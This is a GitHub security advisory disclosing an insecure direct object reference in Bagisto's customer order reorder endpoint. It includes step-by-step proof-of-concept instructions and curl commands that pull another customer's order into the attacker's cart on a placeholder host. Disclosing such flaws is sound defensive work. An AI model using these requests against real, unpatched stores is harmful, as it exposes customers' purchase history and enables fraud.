# [H] Bagisto has IDOR in Customer Order Reorder Functionality

## Summary
Severity: High
Advisory: GHSA-x5rw-qvvp-5cgm
CVE: CVE-2026-21447
CWE: CWE-284, CWE-639
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-01-02
Source: https://github.com/advisories/GHSA-x5rw-qvvp-5cgm
Type: github-advisory

## Affected
- Packagist: `bagisto/bagisto` — affected >=0 <2.3.10

## Details
### Summary

An Insecure Direct Object Reference vulnerability in the customer order reorder function allows any authenticated customer to add items from another customer's order to their own shopping cart by manipulating the order ID parameter. This exposes sensitive purchase information and enables potential fraud.

### Details

The vulnerability exists in the reorder method within OrderController.php. Unlike other order-related functions like view, cancel, printInvoice that properly validate customer ownership, the reorder function retrieves orders using only the order ID without verifying that the order belongs to the authenticated customer.

Code location: `packages/Webkul/Shop/src/Http/Controllers/Customer/Account/OrderController.php`

Exposed Route: `packages/Webkul/Shop/src/Routes/customer-routes.php`

```php
Route::get('reorder/{id}', 'reorder')->name('shop.customers.account.orders.reorder');
```

### PoC

I. Create victim account and place an order.
II. Login as attacker.
III. Exploit IDOR and navigate like:  http://target.xxx/customer/account/orders/reorder/1
IV. Check http://target.xxx/checkout/cart and verify exploitation.
V. Victim's order items are now in Attacker's cart.

### PoC via curl:

```
curl -c cookies.txt -X POST "http://target.xxx/customer/login" -d "email=attacker@evil.com&password=123qwe"

curl -b cookies.txt "http://target.xxx/customer/account/orders/reorder/1"

curl -b cookies.txt "http://target/api/checkout/cart"
```

### Impact

- **Information Disclosure:** Attackers can discover what products other customers have purchased.
- **Potential Fraud:** Attackers could potentially exploit this for social engineering or targeted attacks.

## References
- https://github.com/bagisto/bagisto/security/advisories/GHSA-x5rw-qvvp-5cgm
- https://nvd.nist.gov/vuln/detail/CVE-2026-21447
- https://github.com/bagisto/bagisto/commit/b2b1cf62577245d03a68532478cffbe321df74d3
- https://github.com/bagisto/bagisto
